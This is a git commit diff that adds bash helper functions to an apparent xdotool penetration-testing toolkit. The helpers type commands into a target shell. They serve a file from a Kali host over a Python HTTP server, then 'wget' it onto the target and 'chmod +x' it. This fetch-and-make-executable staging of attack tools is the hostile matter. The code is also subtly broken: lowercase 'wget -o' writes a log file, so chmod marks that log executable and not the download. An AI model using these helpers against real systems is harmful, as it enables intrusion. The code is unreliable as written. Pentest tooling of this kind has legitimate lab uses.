3edac302f60c41edf46ad01c2e9e66047a02ac18
Danny van der Knaap <dvdknaap@users.noreply.github.com>
2025-04-06 08:43:44 -0400

    feat(bash): new scripts (#140)

--- code/xdotool/helpers/linux.sh
+++ code/xdotool/helpers/linux.sh
@@ -61,7 +61,26 @@ curl_download() {
     sleep 0.8
 }
 
+wget_download() {
+    local url="$1"
+    local location="$2"
+
+    if [[ -z "$1" ||  -z "$2" ]]; then
+        paste_command 'Usage: wget_download "url" "location"'
+        exit 1
+    fi
+
+    paste_command "wget ${url} -o ${location}"
+    create_new_line
+    sleep 3
+
+    paste_command "chmod +x ${location}"
+    create_new_line
+    sleep 0.8
+}
+
 FILE_LOCATION=""
+
 curl_upload_file() {
     local location="${1}"
     local file="${2}"
@@ -97,6 +116,48 @@ curl_upload_file() {
     start_python_server "${location}" "${PYTHON_HTTP_PORT}" "${time_to_life}"
 
     curl_download "http://${DOWNLOAD_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"
+
+    # if location is without path add ./ prefix
+    if [[ "${FILE_LOCATION}" == $(basename "${FILE_LOCATION}") ]]; then
+        FILE_LOCATION="./${FILE_LOCATION}"
+    fi
+}
+
+wget_upload_file() {
+    local location="${1}"
+    local file="${2}"
+    local time_to_life="${3:-60}"
+
+    # Check for required arguments
+    if [ -z "${location}" ] || [ -z "${file}" ]; then
+        paste_command 'Usage: wget_upload_file "location" "file"'
+        exit 1
+    fi
+
+    # Generate GUI form items (label, type (optional: default text), name, default (optional))
+    DOWNLOAD_IP_FIELD=$(form_item "download ip" "download_ip" "${KALI_IP}")
+    PYTHON_HTTP_PORT_FIELD=$(form_item "Python HTTP port" "number" "python_http_port" "1234")
+    FILE_LOCATION_FIELD=$(form_item "file location" "file_location" "${file}")
+    CREATE_FOLDER_FIELD=$(form_item "create folder location" "select" "create_folder" "no" "yes|no")
+
+    # Generate GUI form
+    generate_form "${DOWNLOAD_IP_FIELD}" "${PYTHON_HTTP_PORT_FIELD}" "${FILE_LOCATION_FIELD}" "${CREATE_FOLDER_FIELD}"
+
+    DOWNLOAD_IP=${form_data["download_ip"]}
+    PYTHON_HTTP_PORT=${form_data["python_http_port"]}
+    FILE_LOCATION=${form_data["file_location"]}
+    CREATE_FOLDER=${form_data["create_folder"]}
+
+    if [[ "${CREATE_FOLDER}" == "yes" ]]; then
+        paste_command "mkdir -p ${FILE_LOCATION}"
+        create_new_line
+        sleep 0.8
+    fi
+
+    # start python server: location, python http port, TTL time (default: 60)
+    start_python_server "${location}" "${PYTHON_HTTP_PORT}" "${time_to_life}"
+
+    wget_download "http://${DOWNLOAD_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"
 
     # if location is without path add ./ prefix
     if [[ "${FILE_LOCATION}" == $(basename "${FILE_LOCATION}") ]]; then
